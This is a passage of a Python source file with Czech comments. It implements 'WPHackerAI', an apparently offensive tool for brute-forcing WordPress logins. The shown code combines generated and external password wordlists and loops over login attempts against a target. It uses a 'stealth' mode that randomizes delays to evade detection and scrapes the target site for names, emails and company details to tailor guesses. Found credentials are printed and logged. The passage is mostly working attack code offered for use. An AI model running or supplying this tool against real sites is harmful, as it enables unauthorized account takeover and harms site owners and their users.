        # External wordlist
        self.external_passwords = []
    
    def _setup_logger(self) -> logging.Logger:
        """Nastaví logger"""
        logger = logging.getLogger('AI_Engine')
        logger.setLevel(logging.DEBUG)
        
        log_dir = Path.cwd() / self.config.output_dir
        log_dir.mkdir(exist_ok=True)
        
        fh = logging.FileHandler(log_dir / f'ai_crack_{datetime.now():%Y%m%d_%H%M%S}.log')
        fh.setLevel(logging.DEBUG)
        fh.setFormatter(logging.Formatter('%(asctime)s | %(message)s'))
        logger.addHandler(fh)
        
        return logger
    
    def load_wordlist(self, path: str) -> int:
        """Načte externí wordlist"""
        try:
            with open(path, 'r', encoding='utf-8', errors='ignore') as f:
                self.external_passwords = [line.strip() for line in f if line.strip()]
            print(f"{Fore.GREEN}[+] Loaded {len(self.external_passwords)} passwords from {path}{Style.RESET_ALL}")
            return len(self.external_passwords)
        except Exception as e:
            print(f"{Fore.RED}[!] Error loading wordlist: {e}{Style.RESET_ALL}")
            return 0
    
    def prepare_passwords(self, usernames: List[str]):
        """Připraví password list - AI generovaný + externí"""
        
        # Přidat jména do AI generátoru
        for username in usernames:
            self.password_generator.add_name(username)
        
        # Pokud jsme scrapovali web, přidáme kontext
        # (To se dělá externě voláním set_context na generátoru)
    
    def _update_stats(self, success: bool, response_time: float):
        """Aktualizuje statistiky pro adaptivní chování"""
        self.total_attempts += 1
        self.response_times.append(response_time)
        
        if len(self.response_times) > 100:
            self.response_times.pop(0)
        
        # Calculate PPS
        elapsed = time.time() - self.start_time if self.start_time else 1
        self.passwords_per_second = self.total_attempts / elapsed if elapsed > 0 else 0
    
    def _adaptive_wait(self):
        """Adaptivní čekání - učí se z předchozích response time"""
        if not self.config.stealth:
            return
        
        # Average response time + buffer
        if self.response_times:
            avg_response = sum(self.response_times) / len(self.response_times)
            wait = avg_response * random.uniform(0.5, 1.5)
        else:
            wait = random.uniform(self.config.delay_min, self.config.delay_max)
        
        # If we had failures recently, wait longer
        recent_failures = sum(1 for t in self.response_times[-10:] if t > 5)
        if recent_failures > 3:
            wait *= 2
        
        time.sleep(max(0.05, wait))
    
    def crack(self, usernames: List[str], on_progress=None) -> Optional[Dict]:
        """
        Hlavní cracking metoda.
        Vrací dict s credentials nebo None.
        """
        self.start_time = time.time()
        
        print(f"\n{Fore.RED}{Style.BRIGHT}{'='*60}{Style.RESET_ALL}")
        print(f"{Fore.RED}{Style.BRIGHT}   🔥 AI BRUTE FORCE ENGINE - INTELLIGENT CRACKING{Style.RESET_ALL}")
        print(f"{Fore.RED}{Style.BRIGHT}{'='*60}{Style.RESET_ALL}")
        
        # === Připravit hesla ===
        self.prepare_passwords(usernames)
        
        total_passwords = self.password_generator.get_wordlist_size()
        if self.external_passwords:
            total_passwords += len(self.external_passwords)
        
        print(f"{Fore.CYAN}[*] Target usernames: {', '.join(usernames)}{Style.RESET_ALL}")
        print(f"{Fore.CYAN}[*] AI-generated passwords: {self.password_generator.get_wordlist_size()}{Style.RESET_ALL}")
        if self.external_passwords:
            print(f"{Fore.CYAN}[*] External wordlist: {len(self.external_passwords)}{Style.RESET_ALL}")
        print(f"{Fore.CYAN}[*] Total combinations: {len(usernames) * total_passwords}{Style.RESET_ALL}")
        print(f"{Fore.CYAN}[*] Stealth mode: {self.config.stealth} | Depth: {self.config.depth}{Style.RESET_ALL}")
        print()
        
        # === Hlavní cracking loop ===
        for username in usernames:
            print(f"{Fore.YELLOW}[*] Attacking user: {username}{Style.RESET_ALL}")
            
            # Combine AI passwords + external
            password_stream = self.password_generator.generate_all()
            
            if self.external_passwords:
                # Interleave: AI passwords first (smarter), then external
                all_passwords = list(password_stream) + self.external_passwords
            else:
                all_passwords = list(password_stream)
            
            total = len(all_passwords)
            
            for idx, password in enumerate(all_passwords):
                # Check limits
                if self.config.max_attempts > 0 and self.total_attempts >= self.config.max_attempts:
                    print(f"{Fore.YELLOW}[!] Max attempts reached ({self.config.max_attempts}){Style.RESET_ALL}")
                    return None
                
                # === Pokus o přihlášení ===
                start_req = time.time()
                success, message = self.login.try_login(username, password)
                req_time = time.time() - start_req
                
                # Update stats
                self._update_stats(success, req_time)
                
                # === Progress ===
                if idx % 5 == 0 or idx == total - 1:
                    elapsed = time.time() - self.start_time
                    pct = (idx + 1) / total * 100
                    rate = self.total_attempts / elapsed if elapsed > 0 else 0
                    
                    eta_seconds = (total - idx - 1) / rate if rate > 0 else 0
                    eta_str = str(timedelta(seconds=int(eta_seconds)))
                    
                    # Build progress bar
                    bar_len = 30
                    filled = int(bar_len * (idx + 1) // total)
                    bar = '█' * filled + '░' * (bar_len - filled)
                    
                    sys.stdout.write(
                        f"\r{Fore.CYAN}[{bar}] {pct:.1f}% | "
                        f"{idx+1}/{total} | "
                        f"{rate:.1f} p/s | "
                        f"ETA: {eta_str} | "
                        f"Current: {password[:20]}{'...' if len(password) > 20 else ''}{Style.RESET_ALL}"
                    )
                    sys.stdout.flush()
                
                # === Adaptivní delay ===
                self._adaptive_wait()
                
                # === Success ===
                if success:
                    elapsed_total = time.time() - self.start_time
                    print(f"\n\n{Fore.GREEN}{Style.BRIGHT}{'='*60}{Style.RESET_ALL}")
                    print(f"{Fore.GREEN}{Style.BRIGHT}   ✅ CREDENTIALS FOUND!{Style.RESET_ALL}")
                    print(f"{Fore.GREEN}{Style.BRIGHT}{'='*60}{Style.RESET_ALL}")
                    print(f"{Fore.GREEN}   Target: {self.config.target}{Style.RESET_ALL}")
                    print(f"{Fore.GREEN}   Username: {username}{Style.RESET_ALL}")
                    print(f"{Fore.GREEN}   Password: {password}{Style.RESET_ALL}")
                    print(f"{Fore.GREEN}   Method: {self.login.login_method}{Style.RESET_ALL}")
                    print(f"{Fore.GREEN}   Attempts: {self.total_attempts}{Style.RESET_ALL}")
                    print(f"{Fore.GREEN}   Time: {elapsed_total:.1f}s ({elapsed_total/60:.1f}min){Style.RESET_ALL}")
                    print(f"{Fore.GREEN}   Rate: {self.total_attempts/elapsed_total:.1f} p/s{Style.RESET_ALL}")
                    print(f"{Fore.GREEN}{Style.BRIGHT}{'='*60}{Style.RESET_ALL}")
                    
                    # Log success
                    self.logger.info(f"SUCCESS: {username}:{password}")
                    
                    self.found = True
                    self.found_credentials = {
                        'username': username,
                        'password': password,
                        'target': self.config.target,
                        'method': self.login.login_method,
                        'attempts': self.total_attempts,
                        'time': elapsed_total
                    }
                    
                    return self.found_credentials
        
        # No success
        elapsed = time.time() - self.start_time
        print(f"\n\n{Fore.YELLOW}{'='*60}{Style.RESET_ALL}")
        print(f"{Fore.YELLOW}   ❌ Brute force completed - No credentials found{Style.RESET_ALL}")
        print(f"{Fore.YELLOW}   Total attempts: {self.total_attempts}{Style.RESET_ALL}")
        print(f"{Fore.YELLOW}   Time: {elapsed:.1f}s ({elapsed/60:.1f}min){Style.RESET_ALL}")
        print(f"{Fore.YELLOW}{'='*60}{Style.RESET_ALL}")
        
        return None


# ═══════════════════════════════════════════════════════════════════════════════
# MAIN APPLICATION
# ═══════════════════════════════════════════════════════════════════════════════

class WPHackerAI:
    """Hlavní aplikace"""
    
    def __init__(self, config: Config):
        self.config = config
        self.session = AISessionManager(config)
        self.login_engine = WordPressLoginEngine(config, self.session)
        self.ai_engine = AIBruteForceEngine(config, self.session, self.login_engine)
        self.context_scraper = AIContextScraper(self.session)
    
    def print_banner(self):
        print(BANNER)
        print(f"{Fore.YELLOW}[!] Target: {self.config.target}{Style.RESET_ALL}")
        print(f"{Fore.YELLOW}[!] Login URL: {self.config.login_url}{Style.RESET_ALL}")
        
        if self.config.smart_mode:
            print(f"{Fore.GREEN}[✓] AI Smart Mode: ENABLED{Style.RESET_ALL}")
            print(f"{Fore.CYAN}    - Name analysis & mutation{Style.RESET_ALL}")
            print(f"{Fore.CYAN}    - Context-aware generation{Style.RESET_ALL}")
            print(f"{Fore.CYAN}    - Leaked password database{Style.RESET_ALL}")
            print(f"{Fore.CYAN}    - Pattern evolution{Style.RESET_ALL}")
            print(f"{Fore.CYAN}    - Adaptive self-learning{Style.RESET_ALL}")
        else:
            print(f"{Fore.YELLOW}[!] AI Smart Mode: DISABLED{Style.RESET_ALL}")
        
        if self.config.username:
            print(f"{Fore.YELLOW}[!] Target user: {self.config.username}{Style.RESET_ALL}")
        
        print()
    
    def run(self):
        """Spustí kompletní assessment"""
        self.print_banner()
        
        # === 1. Initialize login engine ===
        if not self.login_engine.initialize():
            print(f"{Fore.RED}[!] Cannot access WordPress login{Style.RESET_ALL}")
            return
        
        print()
        
        # === 2. Scrape context (AI-powered) ===
        print(f"{Fore.CYAN}[*] AI Context Scraper: Analyzing target...{Style.RESET_ALL}")
        context = self.context_scraper.scrape(self.config.base_url)
        
        if context['title']:
            print(f"{Fore.GREEN}[+] Page title: {context['title']}{Style.RESET_ALL}")
        if context['emails']:
            print(f"{Fore.GREEN}[+] Emails found: {', '.join(context['emails'][:3])}{Style.RESET_ALL}")
        if context['company']:
            print(f"{Fore.GREEN}[+] Company: {context['company']}{Style.RESET_ALL}")
        if context['year']:
            print(f"{Fore.GREEN}[+] Year:
